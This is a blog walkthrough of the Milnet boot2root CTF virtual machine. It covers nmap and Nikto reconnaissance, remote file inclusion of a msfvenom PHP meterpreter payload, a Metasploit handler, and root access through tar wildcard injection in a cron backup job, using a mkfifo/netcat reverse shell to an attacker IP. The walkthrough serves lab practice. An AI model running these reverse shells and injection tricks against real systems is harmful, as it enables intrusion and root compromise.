@@ -1,0 +1,431 @@
+
+								
+																		Hack the Milnet VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 8, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									This is a boot2root challenge which we will try to complete. This VM is created by Warrior and is a basic exploitable VM so we do not need to worry about any advance exploits and reverse engineering.
+Download the VM from –&gt; https://www.vulnhub.com/entry/milnet-1,148/
+Breaching Methodology
+
+Network Scanning (Nmap)
+Recon (Nikto)
+LFI due to allow_url_inclued
+Install Tamper data (Firefox plugin)
+Generate PHP Backdoor (Msfvenom)
+Upload and execute a backdoor
+Reverse connection (Metasploit)
+Open UNIX wildcard text file
+Privilege Escalation (cron job)
+Import python one-liner for proper TTY shell
+Take root access and capture the flag
+
+Let’s start
+As always start off by locating the target with the netdiscover command.  Our target is 192.168.1.100. Now we will scan our target with nmap to know all about its ports.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.100
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.100
+					
+				
+			
+		
+
+
+Since port 80 was open for http, therefore, we had explored target IP on the browser but didn’t get any useful information. So further we have decided to use Nikto against target URL.
+
+To know more about our target we will use Nikto.
+
+		
+		
+			
+			
+			
+			
+nikto -h 192.168.1.100
+			
+				
+					
+				
+					1
+				
+						nikto -h 192.168.1.100
+					
+				
+			
+		
+
+As per result dumped by Nikto, it tells something about info.php, let verify it.
+
+So when we have browsed http://192.168.1.100/info.php, we found “allow_url_include” is “on” which means we can call any local or remote file and hence it is pointing towards LFI and RFI vulnerability.
+
+Upon finding the said vulnerability our step was clear i.e. we had use Tamper data(Firefox plugin).
+So go to Tools on the menu bar and select Tamper data, When the Tamper Data opens click on Start Tamper.
+
+Now generate the PHP code with the help of which we will have our meterpreter session and to generate the code type:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.108 lport=4444 -f raw
+					
+				
+			
+		
+
+Copy the code from &lt;?php to die() and save it on the file with extension .php, we have saved it as shell.php on the desktop and run command python SimpleHTTPServer 80 for transferring it into target’s system.
+
+Then on Tamper Data give the path of the file without the extension in the text box adjacent to the route. For example type:
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.108/shell.php?
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.108/shell.php?
+					
+				
+			
+		
+
+
+Before clicking on OK run Metasploit and type:
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 192.168.1.108
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 192.168.1.108msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+And when you click on ok you will have your meterpreter session. You can type the following command to get the information about the system:
+
+		
+		
+			
+			
+			
+			
+sysinfo
+			
+				
+					
+				
+					1
+				
+						sysinfo
+					
+				
+			
+		
+
+Then check the list of the thing present in langman by typing :
+
+		
+		
+			
+			
+			
+			
+ls
+			
+				
+					
+				
+					1
+				
+						ls
+					
+				
+			
+		
+
+There is only one folder available so let’s go into it.
+
+		
+		
+			
+			
+			
+			
+cd SDINET
+			
+				
+					
+				
+					1
+				
+						cd SDINET
+					
+				
+			
+		
+
+ls (to check the contents of SDINET)
+Here, in SDINET you will find a text file which will show you all the steps to move ahead. It contains Unix wildcard attacks.
+https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+Some further digging revealed that crontab was running a backup script as root, which used tar to compress the contents of /var/www/html. One of the attacks mentioned in the text document covered tar. The commands we used are:
+
+		
+		
+			
+			
+			
+			
+cat /etc/crontab
+cat /backup/backup.sh
+			
+				
+					
+				
+					12
+				
+						cat /etc/crontabcat /backup/backup.sh
+					
+				
+			
+		
+
+
+On a new terminal generate one-liner malicious code for achieving netcat reverse connection using msfvenom and enter the following command for that.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=8888 R
+			
+				
+					
+				
+					1
+				
+						msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.108 lport=8888 R
+					
+				
+			
+		
+
+After that copy and paste the generated code inside the meterpreter session as described below and start netcat.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 8888
+			
+				
+					
+				
+					1
+				
+						nc -lvp 8888
+					
+				
+			
+		
+
+
+From inside DefenseCode_Unix_WildCards_Gone_Wild.txt, it has a section about how to get a command execution using the tar command
+Next, we ran the following commands inside the meterpreter session:
+
+		
+		
+			
+			
+			
+			
+shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+echo "mkfifo /tmp/ivkwne; nc 192.168.1.108 8888 0&lt;/tmp/ivkwne | /bin/sh &gt;/tmp/ivkwne 2&gt;&amp;1; rm /tmp/ivkwne" &gt; shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
+			
+				
+					
+				
+					12345
+				
+						shellpython3 -c 'import pty;pty.spawn("/bin/bash")'echo "mkfifo /tmp/ivkwne; nc 192.168.1.108 8888 0&lt;/tmp/ivkwne | /bin/sh &gt;/tmp/ivkwne 2&gt;&amp;1; rm /tmp/ivkwne" &gt; shell.shtouch "/var/www/html/--checkpoint-action=exec=sh shell.sh"touch "/var/www/html/--checkpoint=1"
+					
+				
+			
+		
+
+
+The above commands help the tar command to run the file, shell.sh after the first file is archived. Since the backup.sh script is running as root, this has the effect of spawning a netcat shell and sending it to the attack platform on port 8888.
+And if you go back to the terminal window where the listener was on, you will have victim’s reverse connection in some time, after that type following command to import python one-liner script for accessing proper tty shell.
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+And you will root access, further move into the/root directory and grab the credit.txt file and finished this challenge.
+HAPPPPPYYYY HACKIIIIING!!!!!! 
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Mukarram January 18, 2019 at 4:17 pm							
+							
+							
+														
+							
+								Tamper data section is not working. Tamper data is no more available for firefox. any alternative?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
